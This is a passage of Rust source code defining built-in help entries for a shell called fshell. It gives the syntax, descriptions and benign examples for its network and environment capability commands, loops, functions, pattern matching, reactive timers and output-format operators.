        name: "network-capabilities",
        category: HelpCategory::Builtin,
        summary: "Explicit network capability commands",
        description: "Commands that perform network operations under explicit capability grants.\n\n  net-connect <host>:<port>  — Open a TCP connection.\n  net-all                     — List all network capabilities available to the current scope.\n\nThese are the low-level capability-gated network primitives. For HTTP requests, prefer the http builtin.",
        syntax: "net-connect <host>:<port> | net-all",
        examples: &[
            HelpExample {
                input: "net-connect localhost:8080",
                explanation: "Open a TCP connection to port 8080.",
            },
            HelpExample {
                input: "net-all",
                explanation: "List available network capabilities.",
            },
        ],
        flags: &[],
        related: &["capabilities", "http", "process-spawn"],
    },
    HelpTopic {
        name: "environment-capabilities",
        category: HelpCategory::Builtin,
        summary: "Scoped environment variable capability commands",
        description: "Commands that read or write environment variables under explicit capability grants.\n\n  env-read <var>    — Read an environment variable.\n  env-write <var>   — Set an environment variable.\n\nThese provide low-level access to the environment capability model. Most users will prefer export and env for everyday use.",
        syntax: "env-read <var> | env-write <var> <value>",
        examples: &[
            HelpExample {
                input: "env-read PATH",
                explanation: "Read PATH with capability checking.",
            },
            HelpExample {
                input: "env-write MY_VAR hello",
                explanation: "Set MY_VAR under capability control.",
            },
        ],
        flags: &[],
        related: &["export", "env", "capabilities"],
    },
    // Additional Language Constructs
    HelpTopic {
        name: "source",
        category: HelpCategory::Language,
        summary: "Execute a script file in the current scope",
        description: "Loads and executes an fshell script file (.fsh) in the current shell environment. All variables, functions, and aliases defined in the script become available in the current session. The script runs with the current capability context.",
        syntax: "source <path>",
        examples: &[
            HelpExample {
                input: "source ~/.config/fsh/init.fsh",
                explanation: "Re-source the init script to apply changes.",
            },
            HelpExample {
                input: "source ./utils.fsh",
                explanation: "Load utility functions from a local script.",
            },
        ],
        flags: &[],
        related: &["reload", "startup"],
    },
    HelpTopic {
        name: "match",
        category: HelpCategory::Language,
        summary: "Pattern matching expression",
        description: "Match a value against a series of patterns. Each arm has a pattern and an expression. The first matching arm's expression is evaluated and returned. Supports literal patterns, map patterns with field destructuring, and wildcard (_). Arms are separated by commas.",
        syntax: "match <expr> { <pattern> => <expr>, ... }",
        examples: &[
            HelpExample {
                input: "match x { 42 => \"answer\", _ => \"unknown\" }",
                explanation: "Match integer against literals with wildcard default.",
            },
            HelpExample {
                input: "match item { {type: \"file\", name: n} => n, _ => \"unknown\" }",
                explanation: "Destructure a map and bind fields to variables.",
            },
        ],
        flags: &[],
        related: &["types", "expressions"],
    },
    HelpTopic {
        name: "while",
        category: HelpCategory::Language,
        summary: "Loop while a condition is true",
        description: "Repeatedly execute a block of statements as long as the condition expression evaluates to true. The condition is evaluated before each iteration. Returns null — loops are used for side effects.",
        syntax: "while <condition> { <statements> }",
        examples: &[
            HelpExample {
                input: "let i = 0; while i < 5 { echo \"{i}\"; i = i + 1 }",
                explanation: "Count from 0 to 4.",
            },
            HelpExample {
                input: "while true { watch \".\" | limit 1 }",
                explanation: "Poll a directory continuously.",
            },
        ],
        flags: &[],
        related: &["expressions", "if"],
    },
    HelpTopic {
        name: "if",
        category: HelpCategory::Language,
        summary: "Conditional expression",
        description: "Evaluate one of two branches based on a boolean condition. if/else is expression-oriented in fshell — it produces a value. Supports chaining via else if. If the false branch is omitted and the condition is false, returns null.",
        syntax: "if <condition> { <expr> } else { <expr> }",
        examples: &[
            HelpExample {
                input: "let is_large = if size > 1000 { true } else { false }",
                explanation: "Assign based on a condition.",
            },
            HelpExample {
                input: "let cat = if x > 0 { \"positive\" } else if x < 0 { \"negative\" } else { \"zero\" }",
                explanation: "Chained conditions with else if.",
            },
        ],
        flags: &[],
        related: &["while", "expressions", "match"],
    },
    HelpTopic {
        name: "functions",
        category: HelpCategory::Language,
        summary: "Define reusable functions with fn",
        description: "Define named functions that encapsulate reusable pipeline logic. Functions can accept arguments (available as $1, $2, ...), return values, and be composed in pipelines.\n\nFunction bodies are blocks of shell statements. Functions capture their enclosing scope's variables at definition time and can reference them when called.",
        syntax: "fn <name> { <body> } | fn <name>(<arg1>, <arg2>, ...) { <body> }",
        examples: &[
            HelpExample {
                input: "fn greet { echo \"Hello, $1!\" }",
                explanation: "Define a simple function with positional args.",
            },
            HelpExample {
                input: "fn large-files { ls | filter size > 1000 }",
                explanation: "Define a pipeline function.",
            },
            HelpExample {
                input: "greet world",
                explanation: "Call a user-defined function.",
            },
        ],
        flags: &[],
        related: &["variables", "pipeline", "return", "source"],
    },
    HelpTopic {
        name: "for",
        category: HelpCategory::Language,
        summary: "Iterate over values with for-in loops",
        description: "Loop over elements in a list or pipeline output, binding each element to a variable. The loop body executes once per element.\n\nSupports iterating over inline lists, range expressions, and pipeline output.",
        syntax: "for <var> in <expr> { <body> }",
        examples: &[
            HelpExample {
                input: "for x in 1 2 3 { echo $x }",
                explanation: "Iterate over inline values.",
            },
            HelpExample {
                input: "for f in (ls) { echo $f }",
                explanation: "Iterate over pipeline output.",
            },
        ],
        flags: &[],
        related: &["while", "break", "continue", "pipeline", "variables"],
    },
    HelpTopic {
        name: "loop-control",
        category: HelpCategory::Language,
        summary: "Exit or skip loop iterations with break and continue",
        description: "Control loop execution from within the loop body.\n\n  break     — Exit the nearest enclosing loop immediately.\n  continue  — Skip the rest of the current iteration and proceed to the next one.\n\nBoth apply to while and for loops.",
        syntax: "break [<count>] | continue",
        examples: &[
            HelpExample {
                input: "for x in 1 2 3 { if $x == 2 { break } }",
                explanation: "Exit the loop when x equals 2.",
            },
            HelpExample {
                input: "for x in 1 2 3 { if $x == 2 { continue } echo $x }",
                explanation: "Skip the value 2, printing only 1 and 3.",
            },
        ],
        flags: &[],
        related: &["for", "while", "if"],
    },
    HelpTopic {
        name: "return",
        category: HelpCategory::Language,
        summary: "Return a value from a function",
        description: "Exit the current function and optionally return a value to the caller. When used outside a function, return exits the current script or source evaluation.\n\nThe returned value becomes the function's output in the pipeline.",
        syntax: "return [<value>]",
        examples: &[
            HelpExample {
                input: "fn is-big { if $1 > 1000 { return true } }",
                explanation: "Return early from a function based on a condition.",
            },
            HelpExample {
                input: "fn add { return $1 + $2 }",
                explanation: "Return the sum of two arguments.",
            },
        ],
        flags: &[],
        related: &["functions", "source", "try-catch"],
    },
    HelpTopic {
        name: "every",
        category: HelpCategory::Language,
        summary: "Execute a block on a timer or file change",
        description: "Run a block of code repeatedly on a schedule or in response to filesystem changes. The every statement is fshell's reactive execution primitive — ideal for watchdogs, auto-refresh, and live monitoring.\n\nSupports duration-based intervals (every 5s) and filesystem watch patterns (every 1s watch glob).",
        syntax: "every <duration> { <body> } | every <duration> <watch_path> { <body> }",
        examples: &[
            HelpExample {
                input: "every 5s { help }",
                explanation: "Rerun the block every 5 seconds.",
            },
            HelpExample {
                input: "every 1s watch *.rs { echo 'file changed' }",
                explanation: "Watch for file changes and react.",
            },
        ],
        flags: &[],
        related: &["watch", "reactive-cells", "reactive-cell-every"],
    },
    HelpTopic {
        name: "reactive-cell-every",
        category: HelpCategory::Language,
        summary: "Declare a periodic reactive cell with $= every",
        description: "Declare a reactive cell that recalculates on a timer, combining the $= reactive syntax with periodic execution. The cell's value is recomputed at the specified interval.\n\nSyntax: $= every <duration> <expr>\n\nUnlike a plain $= cell (which recalculates when its inputs change), $= every cells recalculate unconditionally on a timer.",
        syntax: "let $<name> = every <duration> <expr>",
        examples: &[HelpExample {
            input: "let $time = every 1s `date`",
            explanation: "A cell that updates every second.",
        }],
        flags: &[],
        related: &["reactive-cells", "every", "unsafe", "variables"],
    },
    // Additional Pipeline Operators
    HelpTopic {
        name: "traverse",
        category: HelpCategory::Pipeline,
        summary: "Walk graph edges to reach connected nodes",
        description: "Traverse an ObjectGraph along edges matching the given label, starting from the current node. Yields all reachable nodes via depth-first traversal. Useful for navigating relationship graphs.",
        syntax: "| traverse <edge_label>",
        examples: &[
            HelpExample {
                input: "$graph | traverse follows | map name",
                explanation: "Follow 'follows' edges and collect names of reachable nodes.",
            },
            HelpExample {
                input: "$graph | traverse depends depth 3",
                explanation: "Traverse dependency edges up to 3 levels deep.",
            },
        ],
        flags: &[],
        related: &["graph", "pipeline"],
    },
    HelpTopic {
        name: "@yaml",
        category: HelpCategory::Pipeline,
        summary: "YAML serialization boundary",
        description: "A bidirectional serialization format boundary operator. @yaml serializes pipeline values to YAML or deserializes YAML input into structured shell records. Supports nested maps and lists.",
        syntax: "| @yaml",
        examples: &[
            HelpExample {
                input: "ls | @yaml",
                explanation: "Output directory listing as YAML.",
            },
        ],
        flags: &[],
        related: &["@json", "@msgpack", "@text"],
    },
    HelpTopic {
        name: "@msgpack",
        category: HelpCategory::Pipeline,
        summary: "MessagePack serialization boundary",
        description: "A bidirectional binary serialization format boundary operator. @msgpack serializes pipeline values to MessagePack binary format or deserializes MessagePack input into structured shell records. More compact than JSON.",
        syntax: "| @msgpack",
        examples: &[
            HelpExample {
                input: "ls | @msgpack",
                explanation: "Output directory listing as MessagePack binary.",
            },
        ],
        flags: &[],
        related: &["@json", "@yaml", "@text"],
    },
    HelpTopic {
        name: "@text",
        category: HelpCategory::Pipeline,
        summary: "Plain text serialization boundary",
        description: "A unidirectional serialization format boundary operator. @text converts pipeline values to plain text strings. Lists become newline-separated, maps become key=value pairs, and other values use their string representation.",
        syntax: "| @text",
        examples: &[
            HelpExample {
                input: "ls | map name | @text",
                explanation: "Output file names as plain text lines.",
            },
            HelpExample {
                input: "cat README.md | @text",
                explanation: "Read a file as plain text pipeline data.",
            },
        ],
        flags: &[],
        related: &["@json", "@yaml", "@msgpack"],
    },
    HelpTopic {
        name: "@csv",
        category: HelpCategory::Pipeline,
        summary: "CSV serialization boundary",
        description: "A bidirectional CSV serialization boundary operator. Parses CSV text from stdin into structured Val::Map records, or serializes structured data back to CSV format. Type coercion is applied: numeric strings become Int/Float values, empty fields become Null.",
        syntax: "| @csv",
        examples: &[HelpExample {
            input: "echo \"name,size\\nmain.rs,14230\" | @csv",
            explanation: "Parses CSV into two records with 'name' and 'size' fields.",
        }],
        flags: &[],
        related: &["@json", "@table", "@bar"],
    },
    HelpTopic {
        name: "@table",
        category: HelpCategory::Pipeline,
        summary: "ASCII table renderer",
        description: "Renders structured data as an aligned ASCII table with column headers. Collects all pipeline records, determines column widths, and formats output as a readable table. Supports up to 100,000 records.",
        syntax: "| @table",
        examples: &[HelpExample {
            input: "ls | @table",
            explanation: "Render directory listing as an ASCII table.",
        }],
        flags: &[],
        related: &["@json", "@bar", "@csv"],
    },
    HelpTopic {
        name: "@bar",
        category: HelpCategory::Pipeline,
        summary: "Horizontal bar chart renderer",
        description: "Renders numeric data as a horizontal bar chart with unicode block characters. The first string field becomes the label, the first numeric field determines bar length. Bars are sorted by value descending.",
        syntax: "| @bar",
        examples: &[HelpExample {
            input: "ls | group-by ext | sort count desc | limit 5 | @bar",
            explanation: "Show top 5 file extensions as a bar chart.",
        }],
        flags: &[],
        related: &["@table", "@chart", "@csv"],
    },
    HelpTopic {
        name: "theme",
        category: HelpCategory::Builtin,
        summary: "List and switch color themes",
        description: "Display available color themes or switch to a specific theme. Themes control syntax highlighting colors in the REPL.\n\nAvailable themes: default, dracula, gruvbox, monokai",
        syntax: "theme [name]",
        examples: &[
            HelpExample {
                input: "theme",
                explanation: "List available themes.",
            },
            HelpExample {
                input: "theme dracula",
                explanation: "Switch to the Dracula color theme.",
            },
        ],
        flags: &[],
        related: &["setopt"],
    },
    HelpTopic {
        name: "lint",
        category: HelpCategory::Builtin,
        summary: "Static analysis for fsh scripts",
        description: "Analyze an fsh script for potential issues, parse errors, and suspicious patterns. Accepts a file path or inline source code. Reports diagnostics with severity levels (error, warning, info).",
        syntax: "lint <file_path|source_string>",
        examples: &[
            HelpExample {
                input: "lint myscript.fsh",
                explanation: "Lint a file on disk.",
            },
            HelpExample {
                input: "lint \"let x = \"",
                explanation: "Lint inline source code.",
            },
        ],
        flags: &[],
        related: &["parse", "source"],
    },
];
